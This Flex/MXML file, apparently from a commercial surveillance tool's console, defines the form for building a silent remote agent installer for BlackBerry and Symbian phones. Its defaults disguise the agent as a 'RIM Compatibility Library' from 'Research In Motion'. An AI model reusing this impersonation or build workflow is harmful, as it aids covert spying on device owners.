<?xml version="1.0" encoding="utf-8"?>
<s:Group xmlns:fx="http://ns.adobe.com/mxml/2009"
				 xmlns:s="library://ns.adobe.com/flex/spark"
				 xmlns:mx="library://ns.adobe.com/flex/mx"
				 width="100%"
				 height="100%"
				 xmlns:build="it.ht.rcs.console.operations.view.agents.build.*">

	<fx:Script>
		<![CDATA[
			import it.ht.rcs.console.monitor.controller.LicenseManager;
			import it.ht.rcs.console.operations.view.agents.build.UploadPopup;
			import it.ht.rcs.console.task.controller.DownloadManager;
			import it.ht.rcs.console.utils.AlertPopUp;
			import it.ht.rcs.console.build.controller.BuildManager;
			import it.ht.rcs.console.build.model.SymbianConf;

			import locale.R;

			import mx.core.UIComponent;
			import mx.managers.PopUpManager;
			import mx.rpc.events.FaultEvent;
			import mx.rpc.events.ResultEvent;

			public function set platform(value:*):void
			{
				if (value == 'blackberry' || value == 'symbian')
					currentState=value;
				else
					currentState='all';

				if (value != null)
					createBtn.platforms=[value];

				if (value == 'symbian')
				{
					if (BuildManager.instance.symbianConf == null)
						getSymbianConf()
				}
			}

			private var fileReference:FileReference;
			private var keyReference:FileReference;

			private var params:Object;

			private function browse():void
			{
				params={platform: 'symbian', binary: {demo: createBtn.demo.selected}, sign: {edition: 'symbian3'}, melt: {appname: appname.text}};

				fileReference=new FileReference();
				fileReference.addEventListener(Event.SELECT, uploadCert);
				fileReference.browse();
			}


			private function browseForKey():void
			{

				keyReference=new FileReference();
				keyReference.addEventListener(Event.SELECT, onKeySelected);
				keyReference.browse([new FileFilter("Key", "*.key")]);
			}

			private function onKeySelected(e:Event):void
			{
				keyTxt.text=keyReference.name;
			}

			private var uploadPopup:UploadPopup;

			private function uploadCert(event:Event):void
			{
				fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
				fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
				fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
				fileReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onUploadComplete);

				uploadPopup=PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
				uploadPopup.fileReference=fileReference;
				PopUpManager.centerPopUp(uploadPopup);
			}

			private function setSymbianConf():void
			{
				//check form completion
				if (uid1Txt.text == "" || uid1Txt.text.length < 8 || uid2Txt.text == "" || uid2Txt.text.length < 8 || uid3Txt.text == "" || uid3Txt.text.length < 8 || uid4Txt.text == "" || uid4Txt.text.length < 8 || uid5Txt.text == "" || uid5Txt.text.length < 8 || uid6Txt.text == "" || uid6Txt.text.length < 8)
				{
					AlertPopUp.show(R.get('MISSING_UIDS'));
					return;
				}
				else if (!keyReference || keyReference.name == null || keyReference.name == "")
				{
					AlertPopUp.show(R.get('MISSING_KEY'));
					return;
				}
				else
				{
					uploadKey()
				}
			}

			private function uploadKey():void
			{
				keyReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
				keyReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
				keyReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
				keyReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onKeyUploadComplete);

				uploadPopup=PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
				uploadPopup.fileReference=keyReference;
				PopUpManager.centerPopUp(uploadPopup);
			}

			private function onKeyUploadComplete(event:DataEvent):void
			{
				var key:String=event.data;
				var conf:Object=new Object();
				conf.key=key;
				conf.uids=[uid1Txt.text, uid2Txt.text, uid3Txt.text, uid4Txt.text, uid5Txt.text, uid6Txt.text]
				BuildManager.instance.getSymbianConf(conf, onSymbianConfResult, onSymbianConfFault)
				PopUpManager.removePopUp(uploadPopup);
			}


			private function onUploadComplete(event:DataEvent):void
			{
				PopUpManager.removePopUp(uploadPopup);

				params['sign']['cert']=event.data;
			}

			private function onUploadError(event:Event):void
			{
				PopUpManager.removePopUp(uploadPopup);
				AlertPopUp.show(event.type);
			}

			protected function create():void
			{

				if (params != null)
					params={platform: parentDocument.platform, binary: {demo: createBtn.demo.selected}, sign: params['sign'], melt: {appname: appname.text}, 'package': {type: 'remote'}};
				else
					params={platform: parentDocument.platform, binary: {demo: createBtn.demo.selected}, melt: {appname: appname.text}, 'package': {type: 'remote'}};

				if (currentState == 'blackberry')
				{
					params['melt']['name']=nameForm.text;
					params['melt']['desc']=descForm.text;
					params['melt']['vendor']=vendorForm.text;
					params['melt']['version']=versionForm.text;
				}

				if (currentState == 'symbian')
				{
					if (!params.sign)
					{
						AlertPopUp.show(R.get('MISSING_CERT'));
						return;
					}

					if (!params.sign.cert)
					{
						AlertPopUp.show(R.get('MISSING_CERT'));
						return;
					}

					params['sign']['edition']=edition.selectedItem;
				}

				params['factory']={_id: parentDocument.factory._id};

				var filename:String=parentDocument.factory.name + "_" + parentDocument.platform + '_silent.zip'

				DownloadManager.instance.createTask("build", filename, params, onSuccess, onFailure);
			}

			private function onSuccess(e:ResultEvent):void
			{
				PopUpManager.removePopUp(((parentDocument as UIComponent).parentDocument).hostComponent);
			}

			private function onFailure(e:FaultEvent):void
			{
				AlertPopUp.show(R.get('TASK_ALREADY_CREATED'));
			}

			public function getSymbianConf():void
			{

				BuildManager.instance.getSymbianConf(null, onSymbianConfResult, onSymbianConfFault)
			}

			private function onSymbianConfResult(e:ResultEvent):void
			{
				BuildManager.instance.symbianConf=e.result as SymbianConf;
			}

			private function onSymbianConfFault(e:FaultEvent):void
			{
				trace("symbian conf fault")
			}
		]]>
	</fx:Script>

	<s:states>
		<s:State name='all'/>
		<s:State name='blackberry'/>
		<s:State name='symbian'/>
	</s:states>

	<s:HGroup left="10"
						top="10"
						verticalAlign="middle">
		<s:Label fontWeight="bold"
						 text="{R.get('APPLICATION_NAME')}"/>
		<s:TextInput id="appname"
								 text="installer"/>
	</s:HGroup>

	<s:Form includeIn="blackberry"
					left="10"
					top="35">
		<s:FormItem label="{R.get('NAME')}">
			<s:TextInput id="nameForm"
									 text="RIM Compatibility Library"
									 width="150"/>
		</s:FormItem>
		<s:FormItem label="{R.get('DESCRIPTION')}">
			<s:TextInput id="descForm"
									 text="RIM Compatibility Library used by applications in the App World"
									 width="200"/>
		</s:FormItem>
		<s:FormItem label="{R.get('VENDOR')}">
			<s:TextInput id="vendorForm"
									 text="Research In Motion"
									 width="150"/>
		</s:FormItem>
		<s:FormItem label="{R.get('VERSION')}">
			<s:TextInput id="versionForm"
									 text="1.1.0"
									 width="100"/>
		</s:FormItem>
	</s:Form>

	<s:Form includeIn="symbian"
					left="10"
					top="35"
					visible="{BuildManager.instance.symbianConf.key==true &amp;&amp; BuildManager.instance.symbianConf.uids.length==6}">
		<s:FormItem label="{R.get('SYMBIAN_CERT')}">
			<s:Button width="80"
								label="{R.get('BROWSE')}..."
								click="browse()"/>
		</s:FormItem>
		<s:FormItem label="S60 Edition">
			<s:DropDownList id="edition"
											selectedIndex="0"
											width="80">
				<mx:ArrayCollection>
					<fx:String>5th3rd</fx:String>
					<fx:String>5th</fx:String>
					<fx:String>3rd</fx:String>
				</mx:ArrayCollection>
			</s:DropDownList>
		</s:FormItem>
	</s:Form>
	<!-- Symbian configuration is OK-->

	<s:VGroup includeIn="symbian"
						left="10"
						top="190"
						visible="{BuildManager.instance.symbianConf.key==true &amp;&amp; BuildManager.instance.symbianConf.uids.length==6}"
						includeInLayout="{BuildManager.instance.symbianConf.key==true &amp;&amp; BuildManager.instance.symbianConf.uids.length==6}">
		<s:Spacer height="40"/>
		<s:Label text="{R.get('SYMBIAN_CONF_OK')}"/>
	</s:VGroup>

	<!-- You have no Symbian configuration yet, please provide the data: -->

	<s:VGroup includeIn="symbian"
						left="10"
						top="190"
						visible="{BuildManager.instance.symbianConf.key!=true || BuildManager.instance.symbianConf.uids.length!=6}"
						includeInLayout="{BuildManager.instance.symbianConf.key!=true || BuildManager.instance.symbianConf.uids.length!=6}">
		<s:Label text="{R.get('SYMBIAN_CONF_MISSED')}"
						 color="0xFF0000"
						 fontWeight="bold"/>

		<s:HGroup paddingTop="10">
			<s:HGroup verticalAlign="middle">
				<s:Label text="uid 1"
								 fontWeight="bold"/>
				<s:TextInput width="62"
										 id="uid1Txt"
										 restrict="A-Fa-f0-9"
										 maxChars="8"/>
			</s:HGroup>
			<s:HGroup verticalAlign="middle">
				<s:Label text="uid 2"
								 fontWeight="bold"/>
				<s:TextInput width="62"
										 id="uid2Txt"
										 restrict="A-Fa-f0-9"
										 maxChars="8"/>
			</s:HGroup>
			<s:HGroup verticalAlign="middle">
				<s:Label text="uid 3"
								 fontWeight="bold"/>
				<s:TextInput width="62"
										 id="uid3Txt"
										 restrict="A-Fa-f0-9"
										 maxChars="8"/>
			</s:HGroup>
		</s:HGroup>

		<s:HGroup>
			<s:HGroup verticalAlign="middle">
				<s:Label text="uid 4"
								 fontWeight="bold"/>
				<s:TextInput width="62"
										 id="uid4Txt"
										 restrict="A-Fa-f0-9"
										 maxChars="8"/>
			</s:HGroup>
			<s:HGroup verticalAlign="middle">
				<s:Label text="uid 5"
								 fontWeight="bold"/>
				<s:TextInput width="62"
										 id="uid5Txt"
										 restrict="A-Fa-f0-9"
										 maxChars="8"/>
			</s:HGroup>
			<s:HGroup verticalAlign="middle">
				<s:Label text="uid 6"
								 fontWeight="bold"/>
				<s:TextInput width="62"
										 id="uid6Txt"
										 restrict="A-Fa-f0-9"
										 maxChars="8"/>
			</s:HGroup>
		</s:HGroup>
		<s:HGroup verticalAlign="middle"
							paddingTop="10">
			<s:Label text="Key"
							 fontWeight="bold"/>
			<s:Button width="80"
								label="{R.get('BROWSE')}..."
								click="browseForKey()"/>
			<s:Label id="keyTxt"
							 text=""/>
		</s:HGroup>
	</s:VGroup>
	<s:Button label="{R.get('CONFIGURATION_SET')}"
						left="10"
						bottom="0"
						right="10"
						visible="{BuildManager.instance.symbianConf.key!=true || BuildManager.instance.symbianConf.uids.length!=6}"
						includeInLayout="{BuildManager.instance.symbianConf.key!=true || BuildManager.instance.symbianConf.uids.length!=6}"
						click="setSymbianConf()"/>

	<build:CreateWithDemoButton id="createBtn"
															left="10"
															bottom="0"
															right="10"
															create="{create}"
															visible="{BuildManager.instance.symbianConf.key==true &amp;&amp; BuildManager.instance.symbianConf.uids.length==6}"/>

</s:Group>
